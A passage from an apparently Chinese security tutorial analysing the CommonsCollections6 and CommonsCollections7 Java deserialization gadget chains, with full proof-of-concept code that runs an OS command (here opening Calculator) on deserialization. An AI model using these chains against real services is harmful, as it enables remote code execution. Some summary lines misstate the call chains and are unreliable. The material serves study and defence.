                commons-collections
                commons-collections
                3.1
###  前置知识
**HashSet**
`HashSet`是一个无序的、不允许有重复元素的集合，本质上就是由`HashMap`实现的，跟`HashMap`一样，都是一个存放链表的数组，`HashSet`中的元素都存放在`HashMap`的`key`上面，而`value`中的值都是统一的一个`private
static final Object PRESENT = new
Object();`，在`HashSet`的`readObject`方法中会调用其内部`HashMap`的`put`方法，将值放在`key`上。
###  CommonsCollections6 分析
在`CommonsCollections5`中，通过对`TiedMapEntry#toString`方法的调用，触发了`TiedMapEntry#getValue`，继而触发了`LazyMap#get`来完成后半段的调用；而在`CommonsCollections6`中则是通过`TiedMapEntry#hashCode`触发对`TiedMapEntry#getValue`的调用，但是需要找到一个触发`hashcode()`方法的点，因此利用前置知识中的`HashSet()`方法来触发`hashCode()`方法。
在`HashSet#readObject`方法中，跟进`put()`方法，进入`java.util.HashMap`中调用`put()`方法，接着调用`hash()`方法，进而调用`key.hashCode()`，这里只需要让`key`为`TiedMapEntry`对象即可。
但是在实际利用是需要解决一个问题，那就是在调用`put`方法的时候就触发命令执行的问题，P牛对此的解决方法是`outerMap.remove("h3rmesk1t");`，成功在反序列化的时候也触发了命令执行。
    package CommonsCollections6;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.*;
    import java.util.HashMap;
    import java.util.Map;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/30 4:38 下午
     */
    public class FakeDemo {
        public static void fakeDemo() throws IOException, ClassNotFoundException {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            Map hashMap = new HashMap();
            Map map = LazyMap.decorate(hashMap, chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
            Map expMap = new HashMap();
            expMap.put(tiedMapEntry, "d1no");
            map.remove("h3rmesk1t");
            try {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(expMap);
                objectOutputStream.close();
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                fakeDemo();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
**POC**
为了解决上述出现的问题，在构造`LazyMap`的时候先构造一个`fakeTransformers`对象，等最后⽣成`Payload`的时候，再利用反射将真正的`transformers`替换进去。
    package CommonsCollections6;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/30 4:29 下午
     */
    public class CommonsCollections6Gadget1 {
        public static void CC6() throws IllegalAccessException, NoSuchFieldException {
            Transformer[] fakeTransformers = new Transformer[] {};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
            Map hashMap = new HashMap();
            Map map = LazyMap.decorate(hashMap, chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
            Map expMap = new HashMap();
            expMap.put(tiedMapEntry, "d1no");
            map.remove("h3rmesk1t");
            Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            //map.clear();
            try {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(expMap);
                objectOutputStream.close();
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                CC6();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
###  调用链
    HashSet.readObject()/HashMap.readObject()
        HashMap.put()
            HashMap.hash()
                TiedMapEntry.hashCode()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            InvokerTransformer.transform()
###  总结
反序列化调用`TiedMapEntry`的`toString`方法，间接调用`LazyMap`的`hashCode`方法，触发了后续的`Transformer`恶意执行链。
## CommonsCollections7链
###  环境搭建
  1. `JDK`版本：JDK1.8u66
  2. `Commons-Collections`版本：3.1
利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。
        4.0.0
        org.example
        commons-collections
        1.0-SNAPSHOT
                commons-collections
                commons-collections
                3.1
###  前置知识
**Hashtable**
`Hashtable`与`HashMap`类似，都是是一种`key-value`形式的哈希表。
    [1] Hashtable 线程安全，HashMap 线程不安全
    [2] HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary
    [3] 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现
    [4] Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key=null 的实体放在 index=0 的位置
跟进`Hashtable`发现，在`readObject`方法中，会调用`reconstitutionPut()`方法，并在`reconstitutionPut()`方法中会调用`key.hashCode()`，后续的调用逻辑和`CommonsCollections6`链基本一致
**哈希碰撞机制**
在[ProgrammerSought](https://www.programmersought.com/article/94401321514/)上给出的说法是：
    The so-called hash conflict, that is, the two key values ​​are calculated by the hash function to obtain the same hash value, and a subscript can only store one key, which produces a hash conflict, if the subscript one of the keys first Saved, the other key must find its own storage location by other means.
也就是说，当两个不同的`key`通过`hash()`方法计算出同一个`hash`值时，而一个下标只能存储一个`key`，这就产生了`hash`冲突。
那么要如何构造出一个`hash`冲突呢，跟进`HashMap#hash`方法。
继续跟进`hashcode()`方法，根据`for`循环中的代码，不难推出`Hash`值的计算公式
这也就不难解释为什么`ysoserial`项目中的`CommonsCollections7`链中是`yy`和`zZ`了，需要时，利用`z3`来计算字符串位数不一样情况下的可能值即可。
    ord("y") == 121
    ord("z") == 122
    ord("Z") == 90
    "yy".hashCode() == 31 × 121 + 1 × 121 == 3872
    "zZ".hashCode() == 31 × 122 + 1 × 90 == 3872
    "yy".hashCode() == "zZ".hashCode() == 3872
###  CommonsCollections7 分析
在`CommonsCollections`链中，利用`AbstractMap#equals`来触发对`LazyMap#get`方法的调用，这里的`m`如果是可控的话，那么设置`m`为`LazyMap`，就可以完成后面的链子构造。
继续跟进看看`equals`方法的调用点在哪，在前面的`Hashtable#reconstitutionPut`方法中存在着调用点：`e.key.equals(key)`，如果这里的`key`可控的话，上面的`m`也就是可控的。
观察到在`readObject`方法中传递进去的`key`，相应的，那么在`writeObject`处也会存在`Hashtable#put`进入的值。
这里还需要注意一个点，由于`if`语句是用`&&`连接判断条件的，那么要执行到后面的`e.key.equals(key)`，就必须先要满足`e.hash
== hash`，接着调用`equals`方法，这里利用到了`Hash`冲突(`Hash`碰撞)机制。
在`POC`中移除第二个`LazyMap`中的元素是因为`get`方法向当前的`map`添加了新元素，从而`map2`变成了两个元素。
###  POC
    package CommonsCollections7;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/30 6:40 下午
     */
    public class CommonsCollections7Gadget {
        public static void CC7() throws NoSuchFieldException, IllegalAccessException {
            Transformer[] faketransformer = new Transformer[]{};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);
            Map hashMap1 = new HashMap();
            Map hashMap2 = new HashMap();
            Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
            map1.put("yy", 1);
            Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
            map2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(map1, 1);
            hashtable.put(map2, 1);
            Class _class = chainedTransformer.getClass();
            Field field = _class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            map2.remove("yy");
            try {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(hashtable);
                objectOutputStream.close();
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                CC7();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
###  调用链
    Hashtable.readObject()
       TiedMapEntry.hashCode()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InvokerTransformer.transform()
###  总结
主体思想是用`Hashtable`代替`HashMap`触发`LazyMap`，后续利用与`CommonsCollections6`链的`HashMap`利用方式基本一致。
## 后言
本文从`Java`反射入手，逐步分析了`ysoserial`项目中的`URLDNS`链和`CommonsCollections1`到`CommonsCollections7`链，在实战中和`CTF`竞赛中往往需要对现有的链子进行改造，但是根本的思想还是类似的，由于自己在分析的过程中还有很多的不足以及不理解的地方，对于文章中的错误欢迎师傅们进行指正。